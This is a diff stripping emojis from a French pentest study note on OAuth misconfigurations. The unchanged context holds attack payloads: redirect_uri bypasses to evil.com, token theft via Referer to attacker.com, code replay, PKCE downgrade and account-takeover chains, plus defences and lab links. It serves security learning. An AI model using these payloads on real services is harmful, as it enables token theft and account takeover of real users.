@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🔑 OAuth — Misconfigurations
+# OAuth — Misconfigurations
 
 > [!info] **En 1 phrase**
 > OAuth = framework d'**autorisation** où une app (le client) obtient un **token** pour accéder aux
@@ -47,7 +47,7 @@ sequenceDiagram
 
 ---
 
-## 🧭 Rappel OAuth 2.0
+## Rappel OAuth 2.0
 
 ### Les 4 rôles
 
@@ -86,9 +86,9 @@ GET /authorize?response_type=code&client_id=CLIENT&scope=openid%20email HTTP/1.1
 
 ---
 
-## 🎭 Les flows OAuth 2.0
+## Les flows OAuth 2.0
 
-> [!warning] ⚠️ **À retenir pour l'exploitation** : chaque flow place le token **différemment**.
+> [!warning] **À retenir pour l'exploitation** : chaque flow place le token **différemment**.
 > - **Authorization Code** → token reçu **côté serveur** (via POST /token) → moins exposé.
 > - **Implicit** → token dans **l'URL (fragment `#`)** → exposé au navigateur, aux logs, aux tiers.
 > - **Client Credentials** → token pour **l'app elle-même**, pas pour un user.
@@ -142,19 +142,19 @@ Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
 
 ---
 
-## 🎯 Misconfigurations & Payloads
+## Misconfigurations & Payloads
 
-> [!tip] 💡 **L'ordre de test** (voir aussi Tips) :
+> [!tip] **L'ordre de test** (voir aussi Tips) :
 > **1. `redirect_uri` → 2. `state` (CSRF) → 3. `scope` → 4. token / code → 5. PKCE**.
 
 ---
 
-### 1️⃣ `redirect_uri` mal validé → vol du token (TOUJOURS tester en premier)
+### 1`redirect_uri` mal validé → vol du token (TOUJOURS tester en premier)
 
 Le AS redirige le navigateur de la victime vers `redirect_uri` **avec le code/token**.
 Si on peut pointer cette URI sur **notre domaine**, on reçoit le token de la victime.
 
-> [!warning] ⚠️ **Règle** : ne JAMAIS allowlister des **domaines entiers**, seulement des **URLs complètes**.
+> [!warning] **Règle** : ne JAMAIS allowlister des **domaines entiers**, seulement des **URLs complètes**.
 > `redirect_uri` acceptant un wildcard (`*.example.com`) ou un domaine = token leak.
 
 ```http
@@ -192,7 +192,7 @@ Host: www.example.com
 
 #### Variantes de bypass du filtre `redirect_uri`
 
-> [!warning] ⚠️ Le parsing d'URL **diffère entre le serveur et le navigateur** (le navigateur
+> [!warning] Le parsing d'URL **diffère entre le serveur et le navigateur** (le navigateur
 > résout en dernier). Si le serveur valide `app.com` mais que le navigateur va sur `evil.com` → TOKEN LEAK.
 
 | Technique | Payload `redirect_uri=` | Idée |
@@ -233,13 +233,13 @@ grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://evil.com/callb
 # 5. L'attaquant appelle /userinfo → identité de la victime → LOGIN sur l'app = ATO complet
 ```
 
-> [!tip] 💡 Vérifier aussi que le **`/token` du AS valide le `redirect_uri`** : si le endpoint
+> [!tip] Vérifier aussi que le `/token` du AS valide le `redirect_uri`** : si le endpoint
 > /token accepte un `redirect_uri` différent de celui de /authorize, on peut rédéemir un code
 > volé avec **notre** redirect_uri même quand /authorize était "protégé".
 
 ---
 
-### 2️⃣ Vol du token via le **Referer**
+### 2Vol du token via le **Referer**
 
 > [!info] **Principe** : on a une **injection HTML** (sans forcément arriver à du XSS) et l'app
 > laisse le token dans l'**URL** (query string du callback, flow implicite avec token dans l'URL,
@@ -258,7 +258,7 @@ Host: attacker.com
 Referer: https://example.com/oauth/callback?code=AUTH_CODE&state=...
 ```
 
-> [!warning] ⚠️ Le **fragment `#` n'est PAS envoyé dans le Referer** : un token en fragment
+> [!warning] Le **fragment `#` n'est PAS envoyé dans le Referer** : un token en fragment
 > (flow implicite) ne fuit PAS par cette voie — mais il fuit si l'app le **recopie dans la query
 > string** ou dans une requête GET suivante.
 
@@ -269,7 +269,7 @@ Referer: https://example.com/oauth/callback?code=AUTH_CODE&state=...
 
 ---
 
-### 3️⃣ XSS via `redirect_uri` (`data:` / `javascript:`)
+### 3XSS via `redirect_uri` (`data:` / `javascript:`)
 
 > [!info] **Principe** : si le AS accepte un schéma `data:` ou `javascript:` comme `redirect_uri`,
 > la victime est redirigée vers notre contenu **avec le token dans l'URL** → exécution de code.
@@ -283,13 +283,13 @@ Host: example.com
   redirection, on contrôle le contenu rendu.
 - `state` reflété dans le HTML de la page de consentement ou du callback → XSS classique.
 - Résultat : le script s'exécute **dans le contexte de l'app** → vol de token / session.
-- Voir la note [[XSS (Cross-Site Scripting)|🖼️ XSS]].
+- Voir la note [[XSS (Cross-Site Scripting)| XSS]].
 
 ---
 
-### 4️⃣ Secrets faibles / secret dans le client
+### 4Secrets faibles / secret dans le client
 
-> [!warning] ⚠️ Le `client_secret` est l'équivalent du **mot de passe de l'app**. Il doit vivre
+> [!warning] Le `client_secret` est l'équivalent du **mot de passe de l'app**. Il doit vivre
 > **uniquement côté serveur**.
 
 ```bash
@@ -313,13 +313,13 @@ strings "Payload/app.app/app" | grep -i secret
 **Si le secret est dans le JS/APK** → on peut faire tourner le flux OAuth nous-mêmes (en tant que
 le client légitime) → échanger des codes volés, rejouer, exploiter d'autres défauts du AS.
 
-> [!tip] 💡 **OAuth Private Key Disclosure** : certaines apps mobiles embarquent même la
+> [!tip] **OAuth Private Key Disclosure** : certaines apps mobiles embarquent même la
 > **clé privée** de signature du client — une simple **décompilation** (apktool / jadx / strings)
 > suffit à la récupérer → on signe des requêtes/assertions au nom de l'app.
 
 ---
 
-### 5️⃣ `state` absent / non vérifié → CSRF
+### 5`state` absent / non vérifié → CSRF
 
 > [!info] **Principe** : le paramètre `state` lie la demande d'autorisation à la session du
 > navigateur (anti-CSRF du callback). S'il est **absent ou non vérifié**, le callback accepte
@@ -339,7 +339,7 @@ Host: example.com
 4. La victime croit avoir "ses" données, mais c'est le compte de l'attaquant → si la victime y dépose
    des infos, l'attaquant les lit. Et inversement, si l'app associe mal, l'attaquant **hérite du compte** (ATO).
 
-> [!warning] ⚠️ La défense officielle du RFC : le `state` doit être **généré par requête** et
+> [!warning] La défense officielle du RFC : le `state` doit être **généré par requête** et
 > **vérifié dans le callback**. Un state fixe / réutilisé / absent = vulnérable.
 
 ```http
@@ -350,7 +350,7 @@ Host: oauth.provider.com
 
 ---
 
-### 6️⃣ Scope escalation
+### 6Scope escalation
 
 > [!info] **Principe** : l'app demande `scope=openid` mais le AS n'est pas censé donner plus.
 > Si on **modifie le scope** dans /authorize (ou dans une demande de consentement rejouée), le AS
@@ -372,13 +372,13 @@ Content-Type: application/x-www-form-urlencoded
 grant_type=authorization_code&code=CODE&redirect_uri=https://app.com/callback&client_id=APP&scope=email+admin
 ```
 
-> [!warning] ⚠️ Vérifier **quelle donnée revient réellement dans `/userinfo`** selon le scope demandé,
+> [!warning] Vérifier **quelle donnée revient réellement dans `/userinfo`** selon le scope demandé,
 > et si l'**access token** porte plus de droits que le scope de l'app. Un token "pas lié au client"
 > (aucune `aud`/`client_id` vérifié) peut être utilisé ailleurs.
 
 ---
 
-### 7️⃣ Authorization Code Rule Violation (code réutilisable)
+### 7Authorization Code Rule Violation (code réutilisable)
 
 > RFC 6749 §4.1.2 : *« The client MUST NOT use the authorization code more than once. If an
 > authorization code is used more than once, the authorization server MUST deny the request and
@@ -395,13 +395,13 @@ grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://app.com/callba
 # 2ème rejeu du même code → devrait être refusé, certains AS le délivrent encore
 ```
 
-> [!tip] 💡 Un code à usage **multiple** permet de délivrer des tokens **à nous et à l'app** à
+> [!tip] Un code à usage **multiple** permet de délivrer des tokens **à nous et à l'app** à
 > partir du même code volé → persistance. Combiner avec un secret compromis (§4) ou un `redirect_uri`
 > non vérifié au /token (§1).
 
 ---
 
-### 8️⃣ Account linking / "Connect another account"
+### 8Account linking / "Connect another account"
 
 > [!info] **Principe** : l'app propose de lier un compte social à un compte local, ou de fusionner
 > deux identités. Si le linking ne **re-vérifie pas** que l'utilisateur authentifié est bien celui
@@ -423,12 +423,12 @@ provider=google&code=ATTACKER_CODE
 4. L'app lie **le compte fournisseur de l'attaquant** au **compte local de la victime**.
 5. L'attaquant se reconnecte via son compte fournisseur → il accède au compte de la victime = **ATO**.
 
-> [!tip] 💡 Même protection que le login CSRF : `state` + vérifier que le code appartient à la
+> [!tip] Même protection que le login CSRF : `state` + vérifier que le code appartient à la
 > **session authentifiée** courante avant de lier.
 
 ---
 
-### 9️⃣ PKCE absent / downgrade
+### 9PKCE absent / downgrade
 
 > [!info] **Principe** : PKCE (`code_challenge` + `code_verifier`) prouve que le code est échangé par
 > le **même navigateur** qui l'a demandé. Sans PKCE (ou si le AS l'accepte **en option**), un code
@@ -456,12 +456,12 @@ grant_type=authorization_code&code=CODE&client_id=APP&redirect_uri=https://app.c
 # Ou : retirer le code_verifier de la requête du client (l'app oublie de le vérifier côté AS)
 ```
 
-> [!tip] 💡 L'attaquant doit d'abord **voler le code** (redirect_uri §1, referer §2, XSS §3).
+> [!tip] L'attaquant doit d'abord **voler le code** (redirect_uri §1, referer §2, XSS §3).
 > PKCE n'empêche pas le vol du code : il empêche que le code volé soit **réutilisable** par l'attaquant.
 
 ---
 
-### 🔟 `response_type` confusion
+### `response_type` confusion
 
 > [!info] **Principe** : le AS doit refuser les `response_type` non enregistrés pour le client.
 > Manipuler `response_type` peut changer **où et comment** le token revient (query vs fragment).
@@ -483,7 +483,7 @@ GET /authorize?response_type=id_token%20token&client_id=APP&redirect_uri=... HTT
 
 ---
 
-## 🚀 Escalades classiques
+## Escalades classiques
 
 | Vecteur initial | Chaîne | Résultat |
 |---|---|---|
@@ -520,7 +520,7 @@ curl "https://api.provider.com/userinfo" -H "Authorization: Bearer $TOKEN"   # l
 
 ---
 
-## 🛠️ Outils & Fuzzing
+## Outils & Fuzzing
 
 | Outil | Usage |
 |---|---|
@@ -583,7 +583,7 @@ curl -s -X POST "https://oauth.provider.com/token" \
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Risque | Défense |
 |---|---|
@@ -602,30 +602,30 @@ curl -s -X POST "https://oauth.provider.com/token" \
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre de test** (efficace et logique)
+> [!tip] **Ordre de test** (efficace et logique)
 > 1. **`redirect_uri`** — le plus rentable : un bypass = token = ATO. Teste toutes les variantes de parsing.
 > 2. **`state`** — retire-le / fixe-le → CSRF, login CSRF, linking.
 > 3. **`scope`** — modifie-le → escalation de données.
 > 4. **token / code** — rejeu du code, token dans referer, échange sans PKCE, usage sans vérif `aud`.
 > 5. **Autres** : secret mobile, `response_type`, découverte OIDC (`/.well-known/openid-configuration`).
 
-> [!warning] ⚠️ **Pièges des wildcards / allowlists**
+> [!warning] **Pièges des wildcards / allowlists**
 > - `*.example.com` inclut des sous-domaines **contrôlés par d'autres** (`demo.example.com`, `dev.example.com`…).
 > - `contains("example.com")` est bypassé par `example.com.evil.com` et `example.com@evil.com`.
 > - `startsWith("https://localhost")` est bypassé par `https://localhost.evil.com`.
 > - Le parseur du **serveur** et celui du **navigateur** peuvent diverger (`@`, `#`, encodage, port) → c'est ça qui donne le bypass.
 > - Le `redirect_uri` doit être validé **dans /authorize ET dans /token**.
 
-> [!warning] ⚠️ **Différences entre les flows (impact sur le test)**
+> [!warning] **Différences entre les flows (impact sur le test)**
 > - **Authorization Code** : le token est côté serveur → le vol passe par le **code** (redirect_uri, referer, CSRF, secret).
 > - **Implicit** : le token est **dans l'URL** → fuites via referer, logs, history, extensions, `data:`/`javascript:` redirect.
 > - **PKCE** ne protège PAS du vol du code, il protège de son **réusage** par l'attaquant.
 > - **Client Credentials** : pas de user → si l'API renvoie des données user avec un tel token, c'est un bug.
 > - Un **refresh_token** volé = accès long terme : priorité au vol de refresh si visible dans le callback/stockage.
 
-> [!tip] 💡 **Petites vérifications qui rapportent**
+> [!tip] **Petites vérifications qui rapportent**
 > - Le `client_secret` est-il dans le **JS de la SPA** ou dans l'**APK** ? → §4.
 > - Le `/userinfo` accepte-t-il un token d'une **autre app** (aud non vérifiée) ?
 > - Le callback accepte-t-il le token **sans contrôle `state`** même quand le `state` est fourni au /authorize ?
@@ -633,12 +633,12 @@ curl -s -X POST "https://oauth.provider.com/token" \
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Attaques JWT|🔏 JWT]] — analyser/forger les access tokens (JWT)
-- [[Open Redirect|↩️ Open Redirect]] — chaînage classique du `redirect_uri`
-- [[Account Takeover|👤 ATO]] — objectif final de toutes ces chaînes
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]] — XSS via `redirect_uri` et vol de token
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — OAuth Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md)
-- 🔬 Labs PortSwigger : [OAuth — Web Security Academy](https://portswigger.net/web-security/oauth)
+- [[Attaques JWT| JWT]] — analyser/forger les access tokens (JWT)
+- [[Open Redirect|↩Open Redirect]] — chaînage classique du `redirect_uri`
+- [[Account Takeover| ATO]] — objectif final de toutes ces chaînes
+- [[XSS (Cross-Site Scripting)| XSS]] — XSS via `redirect_uri` et vol de token
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — OAuth Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md)
+- Labs PortSwigger : [OAuth — Web Security Academy](https://portswigger.net/web-security/oauth)
